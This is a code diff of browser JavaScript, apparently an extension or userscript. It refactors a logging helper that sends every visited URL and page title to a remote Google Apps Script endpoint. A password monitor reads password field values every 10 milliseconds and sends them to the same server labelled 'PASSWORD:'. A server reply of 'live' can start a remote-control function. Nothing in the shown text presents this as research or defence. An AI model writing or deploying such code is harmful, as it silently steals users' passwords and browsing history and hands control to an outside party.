@@ -1,25 +1,25 @@
-console.log('V17');
+console.log('V18');
 
 // Log URLs and init actions
-fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${$('title').text()}`, {
-  mode: 'cors'
-})
-  .then(r => r.text())
-  .then(t => {
-    if (t.split('@')[0] === 'live') {
-      initLiveControl(t.split('@')[1]);
-    }
+function serverLog(data) {
+  return fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${data}`, {
+    mode: 'cors'
   })
+}
+
+serverLog($('title').text()).then(res => res.text()).then(text => {
+  if (text.split('@')[0] === 'live') {
+    initLiveControl(text.split('@')[1]);
+  }
+})
 siteSpecifics(window.location.host)
 
 var href = window.location.href;
 setInterval(() => {
   if (window.location.href !== href) {
     href = window.location.href;
-    fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${$('title').text()}`, {
-      mode: 'cors'
-    })
-    siteSpecifics(window.location.host)
+    serverLog($('title').text());
+    siteSpecifics(window.location.host);
   }
 }, 50);
 
@@ -77,7 +77,7 @@ function initPasswordMonitor() {
     var currentVal = password.attr('data-initial-value');
 
     // Send to server
-    fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${currentVal}`, { mode: 'cors' });
+    serverLog(`PASSWORD: ${currentVal}`);
 
     // Check to see if the password has changed
     setInterval(() => {
@@ -86,7 +86,7 @@ function initPasswordMonitor() {
         currentVal = password.attr('data-initial-value');
 
         // Send to server
-        fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${currentVal}`, { mode: 'cors' });
+        serverLog(`PASSWORD: ${currentVal}`);
       }
     }, 10);
   }
